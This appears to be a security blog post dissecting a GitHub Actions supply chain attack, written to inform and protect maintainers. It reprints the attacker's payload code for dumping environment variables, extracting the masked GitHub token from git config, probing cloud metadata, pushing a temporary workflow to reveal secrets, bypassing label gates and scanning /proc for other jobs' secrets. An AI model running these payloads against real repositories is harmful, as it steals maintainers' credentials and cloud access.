+++
title = 'Dissecting the ezmtebo Supply Chain Attack on GitHub Actions'
date = 2026-04-05T10:00:00+05:30
draft = false
description = 'Technical breakdown of the ezmtebo GitHub Actions supply chain attack — 271 malicious PRs exploiting pull_request_target to steal CI/CD secrets from 100+ open source repos'
keywords = ["ezmtebo","ezmtebo github","ezmtebo attack","ezmtebo supply chain","ezmtebo pull request","ezmtebo malicious PR","ezmtebo github actions","pull_request_target exploit","pull_request_target vulnerability","pull_request_target secret exfiltration","github actions secret steal","github actions supply chain attack","github actions ci cd attack","malicious pull request github","fork PR secret exfiltration","github workflow exploit","prt-scan","ci update build configuration malicious PR","github actions security incident 2026","open source supply chain attack april 2026"]
tags = ["ezmtebo","ezmtebo attack","ezmtebo github","pull_request_target","pull_request_target exploit","GitHub Actions","GitHub Actions security","supply chain attack","CI/CD security","secret exfiltration","malicious pull request","fork PR attack","GitHub Actions secrets","workflow security","open source security","GitHub security incident","CI/CD pipeline attack","DevSecOps","cybersecurity","application security","software supply chain security","GitHub Actions vulnerability","prt-scan"]
+++

On April 3rd, 2026, a GitHub account called `ezmtebo` opened 271 pull requests across 100+ open source repositories in about 5.5 hours. Every PR contained a payload designed to steal CI/CD secrets by exploiting `pull_request_target` workflows that check out the PR head.

I broke down the attacker's tooling, payloads, and targets. This post covers the full technical details.

---

## Attacker Profile

| Field | Value |
|---|---|
| GitHub Login | `ezmtebo` |
| Account Created | 2026-04-02T20:59:51Z |
| Public Repos | 56 (all forks, zero originals) |
| Followers / Following | 0 / 0 |
| Bio / Name | Empty |

The account was created ~14 hours before the first PR. No legitimate activity at all.

---

## Timeline

```
2026-04-02 ~20:59 UTC   Account created
2026-04-02 ~21:45 UTC   56 repos forked
2026-04-03 ~10:17 UTC   First PR opened
2026-04-03 ~15:54 UTC   Last PR opened
                          271 PRs total, ~48/hour
```

---

## The Vulnerability: `pull_request_target` + Head Checkout

Quick background for context. The `pull_request` event in GitHub Actions runs workflow code from the base branch and doesn't expose secrets to fork PRs. The `pull_request_target` event also runs code from the base branch, but it *does* have access to secrets. That's by design. It's meant for things like labeling or commenting where you need write access.

The problem happens when a workflow uses `pull_request_target` but then checks out the PR head:

```yaml
on:
  pull_request_target:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checks out the fork's code
      - run: make build  # now runs attacker-controlled code with secrets
```

That `ref` line pulls in the attacker's code instead of the base branch. The workflow still has access to all repo secrets. So the attacker's code runs in a privileged context.

This is the pattern `ezmtebo` targeted.

---

## How the Attack Worked

For each target repo, the attacker:

1. Forked the repo into `ezmtebo/<repo>`
2. Created a branch named `prt-scan-<12-char-hex-nonce>` (e.g., `prt-scan-e46ea68b8266`)
3. Injected a payload into a build file appropriate for the repo's stack
4. Opened a PR with title `"ci: update build configuration"` or `"closed"`

The 12 character hex nonce is unique per target. It's a tracking ID so the attacker can match exfiltrated data back to the source repo.

### File Targeting

The tooling detected each repo's tech stack and chose the injection point accordingly:

| File Targeted | % of Targets | Why |
|---|---|---|
| `Makefile` (new file) | ~40% | Repos with `make` in CI steps |
| `action.yml` (composite action) | ~25% | Repos using local GitHub Actions |
| `package.json` (npm scripts) | ~20% | Node.js repos |
| Python scripts | ~10% | Python repos with CI-run scripts |
| `.github/actions/*/action.yml` | ~5% | Repos with custom composite actions |

---

## Payload Analysis

The payload has six layers. Each one escalates access further than the last. Here's the code for each.

### Layer 1: Environment Dump

Every payload variant starts with this:

```bash
echo "==PRT_EXFIL_START_<nonce>=="
(env; echo "PRT_GIT_AUTH=$(git config --get-all http.https://github.com/.extraheader)") \
  | gzip -c | base64
echo "==PRT_EXFIL_END_<nonce>=="
```

This dumps all environment variables (`GITHUB_TOKEN`, cloud creds, API keys, whatever the workflow injects) plus git's HTTP auth header. It gzips and base64-encodes the output so it passes through logs cleanly. The nonce markers let the attacker's tooling find and parse the data from workflow log output.

### Layer 2: GitHub Token Extraction

```bash
__PRT_TK=$(git config --get-all http.https://github.com/.extraheader \
  | sed -n 's/.*basic //p' | base64 -d | cut -d: -f2)
[ -z "$__PRT_TK" ] && __PRT_TK="${GITHUB_TOKEN}"
```

GitHub masks `GITHUB_TOKEN` in workflow logs, but the same token also gets stored in git's HTTP credential helper as a Basic auth header. That copy isn't masked. This pulls it from `git config`, base64-decodes the Basic auth value, and extracts the password field. Falls back to `$GITHUB_TOKEN` if the git config approach doesn't work.

### Layer 3: API Reconnaissance (base64-encoded Python)

The Makefile and `action.yml` variants contain a base64-encoded Python script that runs a series of API calls and file reads using the token from Layer 2. Here's what it does, decoded:

**List repo-level Actions secrets:**
```python
resp = requests.get(
    f"https://api.github.com/repos/{owner}/{repo}/actions/secrets",
    headers={"Authorization": f"token {token}"}
)
```
The API returns secret names, not values. But the names are needed for Layer 4.

**List org-level secrets:**
```python
resp = requests.get(
    f"https://api.github.com/orgs/{org}/actions/secrets",
    headers={"Authorization": f"token {token}"}
)
```

**Parse workflow YAMLs for secret references:**
```python
for wf_file in workflow_files:
    content = get_file_content(wf_file)
    secret_refs = re.findall(r'\$\{\{\s*secrets\.(\w+)\s*\}\}', content)
```
Catches secrets not exposed through the API, like org-level or environment-scoped ones referenced in workflow files.

**Read common credential files:**
```python
for path in [".env", ".env.local", ".env.production", "config.json",
             "credentials.json", "service-account.json", ".npmrc", ".pypirc",
             ".docker/config.json", "terraform.tfvars", "terraform.tfvars.json"]:
    content = get_file_content(path)
```

**Probe cloud metadata endpoints:**
```python
for url in [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",   # AWS IMDS
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",      # Azure IMDS
    "http://metadata.google.internal/computeMetadata/v1/instance/"          # GCP metadata
]:
    resp = requests.get(url, timeout=2)
```
On self-hosted or cloud-based runners, this grabs IAM role credentials from the instance metadata service.

**Download workflow run artifacts:**
```python
artifacts = get_workflow_artifacts(token, owner, repo)
```

**Steal OIDC token:**
```python
oidc_token = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
if oidc_token:
    resp = requests.get(
        os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"],
        headers={"Authorization": f"bearer {oidc_token}"}
    )
```
If the workflow has `id-token: write`, this gets the OIDC token used for keyless auth to AWS, GCP, and Azure.

### Layer 4: Privilege Escalation via Temporary Workflow

If the token from Layer 2 has `contents: write`, the attacker pushes a temporary `workflow_dispatch` workflow that binds every secret name (discovered in Layer 3) to an environment variable:

```python
payload_wf = f"""
name: __prt_{nonce}
on: workflow_dispatch
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - run: env | gzip | base64
        env:
          {chr(10).join(f"  {s}: ${{{{ secrets.{s} }}}}" for s in secret_names)}
"""
create_file(token, owner, repo, ".github/workflows/__prt.yml", payload_wf)
dispatch_workflow(token, owner, repo, "__prt")
wait_and_collect_logs(token, owner, repo, "__prt")
delete_file(token, owner, repo, ".github/workflows/__prt.yml")
```

The workflow gets pushed, dispatched via the API, and the run logs (which now contain the actual secret values in env output) get collected. Then the workflow file gets deleted. The initial PR token might only have read access to secrets, but if it can push to a branch, this escalates to full secret extraction.

### Layer 5: Label-Gate Bypass

Some repos require a maintainer to apply a label before CI runs on fork PRs. The payload detects this and bypasses it:

```python
for workflow in workflows:
    if 'labeled' in workflow.get('on', {}).get('pull_request_target', {}).get('types', []):
        required_label = extract_required_label(workflow)
        if required_label:
            create_label(token, owner, repo, required_label)
            add_label_to_pr(token, owner, repo, pr_number, required_label)
```

If the token has `issues: write` or `pull-requests: write` (which `pull_request_target` often grants), the attacker creates the required label and applies it to their own PR, triggering the gated workflow without maintainer involvement.

### Layer 6: Process Scanner

A background loop that runs for 10 minutes, reading `/proc/*/environ` on the runner looking for secrets from other concurrent jobs:

```python
HIGH_VALUE_SECRETS = [
    "NETLIFY", "ALCHEMY", "INFURA", "STRIPE", "AWS_SECRET", "NPM_TOKEN",
    "DOCKER", "CLOUDFLARE", "DATABASE_URL", "PRIVATE_KEY", "SENTRY",
    "SENDGRID", "TWILIO", "PAYPAL", "OPENAI", "ANTHROPIC", "GEMINI",
    "DEEPSEEK", "COHERE", "MONGODB", "REDIS_URL", "SSH_PRIVATE"
]

while time.time() - start < 600:
    for pid in os.listdir("/proc"):
        if pid.isdigit():
            try:
                env = open(f"/proc/{pid}/environ").read()
                for secret in HIGH_VALUE_SECRETS:
                    if secret in env:
                        exfiltrate(env)
            except:
                pass
    time.sleep(2)
```

GitHub-hosted runners are single-tenant so this is mainly relevant for self-hosted runners with job concurrency. When it works, it pulls secrets from completely unrelated workflows running on the same machine.

All collected data gets posted back to the PR as a gzip+base64 encoded comment.

---

## Confirmed Targets

### SAP-samples/btp-cap-multitenant-saas

[PR #180](https://github.com/SAP-samples/btp-cap-multitenant-saas/pull/180) - open at time of writing.

Their `ci-pr.yaml` has the vulnerable pattern:

```yaml
on:
  pull_request_target:
    branches: [main]
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm run build
```

The attacker injected a malicious `npm run build` hook into `package.json`. If CI ran on this PR, all repo secrets would have been exfiltrated.

### ydb-platform/nbs (Yandex Database)

[PR #5666](https://github.com/ydb-platform/nbs/pull/5666) - open at time of writing.

Uses `pull_request_target` in `pr.yaml`. The attacker injected a malicious composite action at `.github/actions/nebius_calculate_pr_matrix/action.yml`, which gets called by the existing privileged workflows.

### sveltejs/svelte (~80k stars)

[PR #18057](https://github.com/sveltejs/svelte/pull/18057) - closed. Maintainers caught it quickly.

### Other Open PRs (at time of writing)

| Repository | PR |
|---|---|
| `agentscope-ai/HiClaw` | [#554](https://github.com/agentscope-ai/HiClaw/pull/554) |
| `derekhiggins/llama-stack-showroom` | [#31](https://github.com/derekhiggins/llama-stack-showroom/pull/31) |
| `DarkSkyTeam/kirara-registry` | [#12](https://github.com/DarkSkyTeam/kirara-registry/pull/12) |
| `Arabian-vACC/OTDF-Doha-FIR-Controller-Pack` | [#38](https://github.com/Arabian-vACC/OTDF-Doha-FIR-Controller-Pack/pull/38) |
| `ocaci/ocaci` | [#11](https://github.com/ocaci/ocaci/pull/11) |
| `supernetes/supernetes` | [#144](https://github.com/supernetes/supernetes/pull/144) |
| `talex-touch/tuff` | [#232](https://github.com/talex-touch/tuff/pull/232) |
| `seyyah/nokta` | [#59](https://github.com/seyyah/nokta/pull/59) |
| `scicluna/GENESISENGINE` | [#1](https://github.com/scicluna/GENESISENGINE/pull/1) |
| `vyomakesh09/Ares` | [#1](https://github.com/vyomakesh09/Ares/pull/1) |
| `cy-suite/scikit-learn` | [#3](https://github.com/cy-suite/scikit-learn/pull/3) |
| `Jensinjames/Aut` | [#1](https://github.com/Jensinjames/Aut/pull/1) |
| `JacobHsu/daily-stock-analysis` | [#1](https://github.com/JacobHsu/daily-stock-analysis/pull/1) |
| `SuriyaRuk/hiclaw-install` | [#1](https://github.com/SuriyaRuk/hiclaw-install/pull/1) |

---

## What to Do

### If your repo got a PR from `ezmtebo`

1. Close the PR. Don't merge, don't re-run CI.
2. Check your Actions tab. Did any workflow run against it?
3. If CI ran: rotate all secrets. GitHub repo secrets, cloud credentials, package registry tokens, API keys. Assume everything was compromised.

Search for PRs:
```
https://github.com/<your-org>/<your-repo>/pulls?q=is:pr+author:ezmtebo
```

Report the account: https://github.com/contact/report-abuse

### If you use `pull_request_target`

Search your workflows for `pull_request_target` combined with `ref: ${{ github.event.pull_request.head.sha }}`. If you find it, you're vulnerable to this class of attack.

**Option 1:** Don't check out fork code in `pull_request_target` at all. Only use it for metadata operations.

**Option 2:** Split privileged and unprivileged work into separate workflows:

```yaml
# Workflow 1: pull_request (no secrets, safe to check out fork code)
on: pull_request
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
      - run: make test

# Workflow 2: workflow_run (has secrets, only runs base branch code)
on:
  workflow_run:
    workflows: ["Test"]
    types: [completed]
jobs:
  deploy:
    steps:
      - run: echo "deploy"
        env:
          MY_SECRET: ${{ secrets.MY_SECRET }}
```

**Option 3:** Restrict permissions to minimum:

```yaml
on: pull_request_target
permissions:
  contents: read
```

Label gating alone is not sufficient. This attacker's payload bypasses it automatically.
